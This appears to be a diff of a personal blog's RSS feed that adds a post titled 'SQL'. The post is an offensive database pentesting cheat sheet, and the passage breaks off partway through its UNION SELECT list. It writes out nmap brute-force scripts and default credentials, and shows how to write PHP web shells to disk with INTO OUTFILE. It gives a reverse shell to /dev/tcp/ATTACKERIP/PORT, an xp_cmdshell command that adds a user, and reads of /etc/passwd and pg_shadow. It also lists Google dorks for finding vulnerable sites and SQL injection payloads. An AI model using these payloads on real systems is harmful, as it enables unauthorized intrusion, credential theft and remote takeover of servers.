@@ -1,13 +1,698 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>Posts on Hi, I&#39;m Quac Tran</title>
+        <title>Posts on Quac Tran</title>
         <link>https://tranquac.github.io/posts/</link>
-        <description>Recent content in Posts on Hi, I&#39;m Quac Tran</description>
+        <description>Recent content in Posts on Quac Tran</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Mon, 07 Jun 2021 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Tue, 08 Jun 2021 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://tranquac.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>SQL</title>
+            <link>https://tranquac.github.io/posts/2021/06/sql/</link>
+            <pubDate>Tue, 08 Jun 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://tranquac.github.io/posts/2021/06/sql/</guid>
+            <description>General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Google Dorking Bad character detect Detect number of vulnerable columns Union Select bypass usando comentarios bypass usando comentarios and url encoding Information_schema.tables bypass concat group_concat Authen bypass   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql -host=TARGETIP -u root -p mysql -u root -p password -e &amp;#39;show databases;&amp;#39; mysql -u root -p password DBNAME -e &amp;#39;select * from TABLENAME;&amp;#39; Access Locally: mysql -u root -p mysql&amp;gt; use DBNAME; mysql&amp;gt; show tables; Command Backdoor example: SELECT &amp;#34;&amp;lt;?</description>
+            <content type="html"><![CDATA[<ul>
+<li><a href="#general">General</a>
+<ul>
+<li><a href="#mysql-3306">MySQL (3306)</a></li>
+<li><a href="#mssql-1433">MSSQL (1433)</a></li>
+<li><a href="#oracle-1521">Oracle (1521)</a></li>
+<li><a href="#postgressql-5432">PostgresSQL (5432)</a></li>
+</ul>
+</li>
+<li><a href="#sql-injection">SQL Injection</a>
+<ul>
+<li><a href="#google-dorking">Google Dorking</a></li>
+<li><a href="#bad-character-detect">Bad character detect</a></li>
+<li><a href="#detect-number-of-vulnerable-columns">Detect number of vulnerable columns</a></li>
+<li><a href="#union-select">Union Select</a></li>
+<li><a href="#bypass-usando-comentarios">bypass usando comentarios</a></li>
+<li><a href="#bypass-usando-comentarios-and-url-encoding">bypass usando comentarios and url encoding</a></li>
+<li><a href="#information_schema.tables-bypass">Information_schema.tables bypass</a></li>
+<li><a href="#concat">concat</a></li>
+<li><a href="#group_concat">group_concat</a></li>
+<li><a href="#authen-bypass">Authen bypass</a></li>
+</ul>
+</li>
+<li><a href="#sqlmap">SQLMAP</a></li>
+<li><a href="#reference">Reference</a></li>
+</ul>
+<h1 id="general">General</h1>
+<h2 id="mysql-3306">MySQL-3306</h2>
+<h4 id="nmap">Nmap</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -Pn -sV -p <span style="color:#ae81ff">3306</span> --script mysql* TARGETIP
+</code></pre></div><h4 id="access-remotely">Access Remotely:</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">mysql <span style="color:#f92672">-</span><span style="color:#66d9ef">host</span><span style="color:#f92672">=</span>TARGETIP <span style="color:#f92672">-</span>u root <span style="color:#f92672">-</span>p
+mysql <span style="color:#f92672">-</span>u root <span style="color:#f92672">-</span>p password <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;show databases;&#39;</span>
+mysql <span style="color:#f92672">-</span>u root <span style="color:#f92672">-</span>p password DBNAME <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;select * from TABLENAME;&#39;</span>
+</code></pre></div><h4 id="access-locally">Access Locally:</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">mysql <span style="color:#f92672">-</span>u root <span style="color:#f92672">-</span>p
+mysql<span style="color:#f92672">&gt;</span> use DBNAME;
+mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> tables;
+</code></pre></div><h4 id="command-backdoor-example">Command Backdoor example:</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#34;/var/www/html/backdoor.php&#34;</span>;
+<span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#34;/tmp/shell.php&#34;</span>;
+</code></pre></div><h4 id="update-a-field-example-ie-change-a-password">Update a field example: (i.e. change a password):</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">update</span> TABLENAME <span style="color:#66d9ef">set</span> PASSWORDFIELD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NEWHASH&#39;</span> <span style="color:#66d9ef">where</span> USERNAMEFIELD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;USERNAME&#39;</span>;
+</code></pre></div><h4 id="phpmyadmin">PHPMyAdmin</h4>
+<p>Default User: root<br>
+Default Password: (none)<br>
+Create a new table, then go to the SQL tab</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#34;C:\\xampp\\htdocs\\command.php&#34;</span>;<span style="color:#f92672">`</span>
+http:<span style="color:#f92672">//</span>TARGTEIP<span style="color:#f92672">/</span>phpmyadmin<span style="color:#f92672">/</span>command.php<span style="color:#f92672">?</span>cmd<span style="color:#f92672">=</span>ipconfig
+</code></pre></div><h2 id="mssql-1433">MSSQL-1433</h2>
+<p>Default username : sa</p>
+<h4 id="nmap-1">Nmap</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sV -Pn -p <span style="color:#ae81ff">1433</span> --script ms-sql-brute --script-args
+userdb<span style="color:#f92672">=</span>users.txt,passdb<span style="color:#f92672">=</span>passwords.txt TARGETIP
+nmap -p <span style="color:#ae81ff">1433</span> --script ms-sql-xp-cmdshell --script-args
+mssql.username<span style="color:#f92672">=</span>sa,mssql.password<span style="color:#f92672">=</span>sa,ms-sql-xp-cmdshell.cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;net usertester Tester123! /add&#34;</span> TARGETIP
+</code></pre></div><h4 id="sqsh">Sqsh.</h4>
+<p><a href="https://sourceforge.net/projects/sqsh/">https://sourceforge.net/projects/sqsh/</a><br>
+You can use sqsh to interact with MSSQL databases.<br>
+Install the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apt-get install freetds
+apt-get install sqsh
+</code></pre></div><p>Edit /etc/freetds/freetds.conf</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>SERVERNAME<span style="color:#f92672">]</span>
+host <span style="color:#f92672">=</span> 10.11.12.13
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1433</span>
+tds version <span style="color:#f92672">=</span> 8.0
+</code></pre></div><p>Edit .sqshrc<br>
+<code>\set style=vert</code><br>
+Connect to the database:\</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqsh -S SERVERNAME -U USER -P PASSWORD
+&gt;exec xp_cmdshell <span style="color:#e6db74">&#39;whoami&#39;</span>
+&gt;go
+</code></pre></div><p>Metasploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">use auxiliary/scanner/mssql/mssql_login
+use exploit/windows/mssql/mssql_payload
+</code></pre></div><h2 id="oracle-1521">Oracle-1521</h2>
+<h4 id="nmap-2">Nmap:</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sV -Pn -p <span style="color:#ae81ff">1521</span> --script<span style="color:#f92672">=</span>oracle-sid-brute TARGETIP
+nmap -sV -Pn -p <span style="color:#ae81ff">1521</span> --script<span style="color:#f92672">=</span>oracle-enum-users --script-args sid<span style="color:#f92672">=</span>ORCL,userdb<span style="color:#f92672">=</span>users.txt TARGETIP
+</code></pre></div><h4 id="connect-to-oracle-from-command-line">Connect to Oracle from command line:</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\&gt;</span>sqlplus / as sysdba
+<span style="color:#f92672">[</span>will prompt <span style="color:#66d9ef">for</span> password<span style="color:#f92672">]</span>
+C:<span style="color:#ae81ff">\&gt;</span>sqlplus
+<span style="color:#f92672">[</span>will prompt <span style="color:#66d9ef">for</span> user and password<span style="color:#f92672">]</span>
+</code></pre></div><h4 id="oracle-default-accounts">Oracle Default Accounts:</h4>
+<p><a href="https://www.orafaq.com/wiki/List_of_default_database_users">https://www.orafaq.com/wiki/List_of_default_database_users</a>
+<a href="http://www.petefinnigan.com/default/default_password_list.htm">http://www.petefinnigan.com/default/default_password_list.htm</a><br>
+Examples: applsys|apps; ctxsys|ctxsys;dbsnmp|dbsnmp &hellip;</p>
+<h2 id="postgressql-5432">PostgresSQL-5432</h2>
+<p>Default User: postgres
+Default Password: (none)
+Local Login:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psql -d DATABASE -U USER
+</code></pre></div><p>Remote Login:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psql -h TARGETIP -d DATABASE -U USER
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">select</span> version<span style="color:#f92672">()</span>;	
+<span style="color:#66d9ef">select</span> current_database<span style="color:#f92672">()</span>;
+<span style="color:#66d9ef">select</span> current_user;
+<span style="color:#66d9ef">select</span> session_user;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;log_connections&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;log_statement&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;port&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;password_encryption&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;krb_server_keyfile&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;virtual_host&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;port&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;config_file&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;hba_file&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> current_setting<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;data_directory&#39;</span><span style="color:#f92672">)</span>;
+<span style="color:#66d9ef">select</span> * from pg_shadow;
+<span style="color:#66d9ef">select</span> * from pg_group;
+create table myfile <span style="color:#f92672">(</span>input TEXT<span style="color:#f92672">)</span>;
+copy myfile from <span style="color:#e6db74">&#39;/etc/passwd&#39;</span>; 
+<span style="color:#66d9ef">select</span> * from myfile;copy myfile to /tmp/test;
+</code></pre></div><h1 id="sql-injection">SQL Injection</h1>
+<h3 id="google-dorking">Google Dorking</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: mysql_fetch_assoc()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: mysql_fetch_array()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: mysql_num_rows()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: session_start()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: getimagesize()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: is_writable()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: getimagesize()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: Unknown()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: session_start()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: mysql_result()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: pg_exec()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: mysql_result()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: mysql_num_rows()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: mysql_query()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: array_merge()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: preg_match()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: ilesize()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: filesize()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: filesize()&#34;</span>
+inurl:<span style="color:#e6db74">&#34;id=&#34;</span> &amp; intext:<span style="color:#e6db74">&#34;Warning: require()
+</span><span style="color:#e6db74">inurl:aboutbook.php?id=
+</span><span style="color:#e6db74">inurl:review.php?id=
+</span><span style="color:#e6db74">inurl:loadpsb.php?id=
+</span><span style="color:#e6db74">inurl:ages.php?id=
+</span><span style="color:#e6db74">inurl:material.php?id=
+</span><span style="color:#e6db74">inurl:clanek.php4?id=
+</span><span style="color:#e6db74">inurl:announce.php?id=
+</span><span style="color:#e6db74">inurl:chappies.php?id=
+</span><span style="color:#e6db74">inurl:read.php?id=
+</span><span style="color:#e6db74">inurl:viewapp.php?id=
+</span><span style="color:#e6db74">inurl:viewphoto.php?id=
+</span><span style="color:#e6db74">inurl:rub.php?idr=
+</span><span style="color:#e6db74">inurl:galeri_info.php?l=
+</span><span style="color:#e6db74">inurl:review.php?id=
+</span><span style="color:#e6db74">inurl:iniziativa.php?in=
+</span><span style="color:#e6db74">inurl:curriculum.php?id=
+</span><span style="color:#e6db74">inurl:labels.php?id=
+</span><span style="color:#e6db74">inurl:story.php?id=
+</span><span style="color:#e6db74">inurl:look.php?ID=
+</span><span style="color:#e6db74">inurl:newsone.php?id=
+</span><span style="color:#e6db74">inurl:aboutbook.php?id=
+</span><span style="color:#e6db74">inurl:material.php?id=
+</span><span style="color:#e6db74">inurlpinions.php?id=
+</span><span style="color:#e6db74">inurl:announce.php?id=
+</span><span style="color:#e6db74">inurl:rub.php?idr=
+</span><span style="color:#e6db74">inurl:galeri_info.php?l=
+</span><span style="color:#e6db74">inurl:tekst.php?idt=
+</span><span style="color:#e6db74">inurl:event.php?id=
+</span><span style="color:#e6db74">inurlroduct-item.php?id=
+</span><span style="color:#e6db74">inurl:sql.php?id=
+</span><span style="color:#e6db74">inurl:news_view.php?id=
+</span><span style="color:#e6db74">inurl:select_biblio.php?id=
+</span><span style="color:#e6db74">inurl:humor.php?id=
+</span><span style="color:#e6db74">inurl:aboutbook.php?id=
+</span><span style="color:#e6db74">inurl:fiche_spectacle.php?id=
+</span><span style="color:#e6db74">inurl:view_items.php?id= 
+</span><span style="color:#e6db74">inurl:home.php?cat= 
+</span><span style="color:#e6db74">inurl:item_book.php?CAT= 
+</span><span style="color:#e6db74">inurl:www/index.php?page= 
+</span><span style="color:#e6db74">inurl:schule/termine.php?view= 
+</span><span style="color:#e6db74">inurl:goods_detail.php?data= 
+</span><span style="color:#e6db74">inurl:storemanager/contents/item.php?page_code= 
+</span><span style="color:#e6db74">inurl:view_items.php?id= 
+</span><span style="color:#e6db74">inurl:customer/board.htm?mode= 
+</span><span style="color:#e6db74">inurl:help/com_view.html?code= 
+</span><span style="color:#e6db74">inurl:n_replyboard.php?typeboard= 
+</span><span style="color:#e6db74">inurl:eng_board/view.php?T****= 
+</span><span style="color:#e6db74">inurl:prev_results.php?prodID= 
+</span><span style="color:#e6db74">inurl:bbs/view.php?no= 
+</span><span style="color:#e6db74">inurl:gnu/?doc= 
+</span><span style="color:#e6db74">inurl:zb/view.php?uid= 
+</span><span style="color:#e6db74">inurl:global/product/product.php?gubun= 
+</span><span style="color:#e6db74">inurl:m_view.php?ps_db= 
+</span><span style="color:#e6db74">inurl:productlist.php?tid= 
+</span><span style="color:#e6db74">inurl:product-list.php?id= 
+</span><span style="color:#e6db74">inurl:onlinesales/product.php?product_id= 
+</span><span style="color:#e6db74">inurl:garden_equipment/Fruit-Cage/product.php?pr= 
+</span><span style="color:#e6db74">inurl:product.php?shopprodid= 
+</span><span style="color:#e6db74">inurl:product_info.php?products_id= 
+</span><span style="color:#e6db74">inurl:productlist.php?tid= 
+</span><span style="color:#e6db74">inurl:showsub.php?id= 
+</span><span style="color:#e6db74">inurl:productlist.php?fid= 
+</span><span style="color:#e6db74">inurl:products.php?cat= 
+</span><span style="color:#e6db74">inurl:products.php?cat= 
+</span><span style="color:#e6db74">inurl:product-list.php?id= 
+</span><span style="color:#e6db74">inurl:product.php?sku= 
+</span><span style="color:#e6db74">inurl:store/product.php?productid= 
+</span><span style="color:#e6db74">inurl:products.php?cat= 
+</span><span style="color:#e6db74">inurl:productList.php?cat= 
+</span><span style="color:#e6db74">inurl:product_detail.php?product_id= 
+</span><span style="color:#e6db74">inurl:product.php?pid= 
+</span><span style="color:#e6db74">inurl:view_items.php?id= 
+</span><span style="color:#e6db74">inurl:more_details.php?id= 
+</span><span style="color:#e6db74">inurl:county-facts/diary/vcsgen.php?id= 
+</span><span style="color:#e6db74">inurl:idlechat/message.php?id= 
+</span><span style="color:#e6db74">inurl:podcast/item.php?pid= 
+</span><span style="color:#e6db74">inurl:products.php?act= 
+</span><span style="color:#e6db74">inurl:details.php?prodId= 
+</span><span style="color:#e6db74">inurl:socsci/events/full_details.php?id= 
+</span><span style="color:#e6db74">inurl:ourblog.php?categoryid= 
+</span><span style="color:#e6db74">inurl:mall/more.php?ProdID= 
+</span><span style="color:#e6db74">inurl:archive/get.php?message_id= 
+</span><span style="color:#e6db74">inurl:review/review_form.php?item_id= 
+</span><span style="color:#e6db74">inurl:english/publicproducts.php?groupid= 
+</span><span style="color:#e6db74">inurl:news_and_notices.php?news_id= 
+</span><span style="color:#e6db74">inurl:rounds-detail.php?id=
+</span><span style="color:#e6db74">sqlmap.py -g &#34;</span>DOKR<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">sqlmap.py -g &#34;</span>inurl:<span style="color:#ae81ff">\&#34;</span>.php?id<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;
+</span></code></pre></div><h3 id="bad-character-detect">Bad character detect</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">&#39;&#39;
+</span><span style="color:#e6db74">`
+</span><span style="color:#e6db74">``
+</span><span style="color:#e6db74">,
+</span><span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">&#34;&#34;
+</span><span style="color:#e6db74">/
+</span><span style="color:#e6db74">//
+</span><span style="color:#e6db74">\
+</span><span style="color:#e6db74">\\
+</span><span style="color:#e6db74">;
+</span><span style="color:#e6db74">&#39;</span> or <span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">-- or # 
+</span><span style="color:#e6db74">&#39; OR &#39;1
+</span><span style="color:#e6db74">&#39; OR 1 -- -
+</span><span style="color:#e6db74">&#34;</span> OR <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">&#34;</span> OR 1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> -- -
+<span style="color:#e6db74">&#39; OR &#39;&#39; = &#39;</span>
+<span style="color:#e6db74">&#39;=&#39;</span>
+<span style="color:#e6db74">&#39;LIKE&#39;</span>
+<span style="color:#e6db74">&#39;=0--+
+</span><span style="color:#e6db74"> OR 1=1
+</span><span style="color:#e6db74">&#39;</span> OR <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x
+</span><span style="color:#e6db74">&#39;</span> AND id IS NULL; --
+<span style="color:#e6db74">&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;</span><span style="color:#ae81ff">2</span>
+%00
+/*…*/ 
++
+<span style="color:#f92672">||</span>
+%
+AND <span style="color:#ae81ff">1</span>
+AND <span style="color:#ae81ff">0</span>
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1<span style="color:#e6db74">&#39; ORDER BY 1--+
+</span><span style="color:#e6db74">1&#39;</span> ORDER BY 2--+
+1<span style="color:#e6db74">&#39; ORDER BY 3--+
+</span><span style="color:#e6db74">1&#39;</span> ORDER BY 1,2--+
+1<span style="color:#e6db74">&#39; ORDER BY 1,2,3--+
+</span><span style="color:#e6db74">1&#39;</span> GROUP BY 1,2,--+
+1<span style="color:#e6db74">&#39; GROUP BY 1,2,3--+
+</span><span style="color:#e6db74">&#39;</span> GROUP BY columnnames having 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -- - 
+-1<span style="color:#e6db74">&#39; UNION SELECT 1,2,3--+
+</span><span style="color:#e6db74">&#39;</span> UNION SELECT sum<span style="color:#f92672">(</span>columnname <span style="color:#f92672">)</span> from tablename -- - 
+-1 UNION SELECT <span style="color:#ae81ff">1</span> INTO @,@
+-1 UNION SELECT <span style="color:#ae81ff">1</span> INTO @,@,@
+<span style="color:#ae81ff">1</span> AND <span style="color:#f92672">(</span>SELECT * FROM Users<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 1	
+<span style="color:#e6db74">&#39; AND MID(VERSION(),1,1) = &#39;</span>5<span style="color:#e6db74">&#39;;
+</span><span style="color:#e6db74">&#39;</span> and <span style="color:#ae81ff">1</span> in <span style="color:#f92672">(</span><span style="color:#66d9ef">select</span> min<span style="color:#f92672">(</span>name<span style="color:#f92672">)</span> from sysobjects where xtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;U&#39;</span> and name &gt; <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">)</span> --
+,<span style="color:#f92672">(</span><span style="color:#66d9ef">select</span> * from <span style="color:#f92672">(</span><span style="color:#66d9ef">select</span><span style="color:#f92672">(</span>sleep<span style="color:#f92672">(</span>10<span style="color:#f92672">)))</span>a<span style="color:#f92672">)</span>
+%2c<span style="color:#f92672">(</span><span style="color:#66d9ef">select</span>%20*%20from%20<span style="color:#f92672">(</span><span style="color:#66d9ef">select</span><span style="color:#f92672">(</span>sleep<span style="color:#f92672">(</span>10<span style="color:#f92672">)))</span>a<span style="color:#f92672">)</span>
+<span style="color:#e6db74">&#39;;WAITFOR DELAY &#39;</span>0:0:30<span style="color:#e6db74">&#39;--
+</span><span style="color:#e6db74">#
+</span><span style="color:#e6db74">/*
+</span><span style="color:#e6db74">-- -
+</span><span style="color:#e6db74">;%00
+</span><span style="color:#e6db74">`
+</span><span style="color:#e6db74">/?q=1
+</span><span style="color:#e6db74">/?q=1&#39;</span>
+/?q<span style="color:#f92672">=</span>1<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">/?q=[1]
+</span><span style="color:#e6db74">/?q[]=1
+</span><span style="color:#e6db74">/?q=1`
+</span><span style="color:#e6db74">/?q=1\
+</span><span style="color:#e6db74">/?q=1/*&#39;*/
+</span><span style="color:#e6db74">/?q=1/*!1111&#39;*/
+</span><span style="color:#e6db74">/?q=1&#39;||&#39;asd&#39;||&#39;
+</span><span style="color:#e6db74">/?q=1&#39; or &#39;1&#39;=&#39;1
+</span><span style="color:#e6db74">/?q=1 or 1=1
+</span><span style="color:#e6db74">/?q=&#39;or&#39;&#39;=&#39;
+</span></code></pre></div><h3 id="detect-number-of-vulnerable-columns">Detect number of vulnerable columns</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ORDER BY 1-- 
+ORDER BY 2-- 
+ORDER BY 3-- 
+ORDER BY 4-- 
+ORDER BY 5-- 
+ORDER BY 6-- 
+ORDER BY 7-- 
+ORDER BY 8-- 
+ORDER BY 9-- 
+ORDER BY 10-- 
+
+ORDER BY 1# 
+ORDER BY 2# 
+ORDER BY 3# 
+ORDER BY 4# 
+ORDER BY 5# 
+ORDER BY 6# 
+ORDER BY 7# 
+ORDER BY 8# 
+ORDER BY 9# 
+ORDER BY 10#
+</code></pre></div><h3 id="union-select">Union Select</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">UNION SELECT <span style="color:#ae81ff">1</span>
+UNION SELECT 1,2
+UNION SELECT 1,2,3
+UNION SELECT 1,2,3,4
+UNION SELECT 1,2,3,4,5
+UNION SELECT 1,2,3,4,5,6
+UNION SELECT 1,2,3,4,5,6,7
+UNION ALL SELECT <span style="color:#ae81ff">1</span>
+UNION ALL SELECT 1,2
+UNION ALL SELECT 1,2,3
+UNION ALL SELECT 1,2,3,4
+UNION ALL SELECT 1,2,3,4,5
+UNION ALL SELECT 1,2,3,4,5,6
+UNION ALL SELECT 1,2,3,4,5,6,7
+
+UNION<span style="color:#f92672">(</span>SELECT 1<span style="color:#f92672">)</span>
+UNION<span style="color:#f92672">(</span>SELECT 1,2<span style="color:#f92672">)</span>
+UNION<span style="color:#f92672">(</span>SELECT 1,2,3<span style="color:#f92672">)</span>
+UNION<span style="color:#f92672">(</span>SELECT 1,2,3,4<span style="color:#f92672">)</span>
+UNION<span style="color:#f92672">(</span>SELECT 1,2,3,4,5<span style="color:#f92672">)</span>
+UNION<span style="color:#f92672">(</span>SELECT 1,2,3,4,5,6<span style="color:#f92672">)</span>
+UNION<span style="color:#f92672">(</span>SELECT 1,2,3,4,5,6,7<span style="color:#f92672">)</span>
+
+UNION ALL<span style="color:#f92672">(</span>SELECT 1<span style="color:#f92672">)</span>
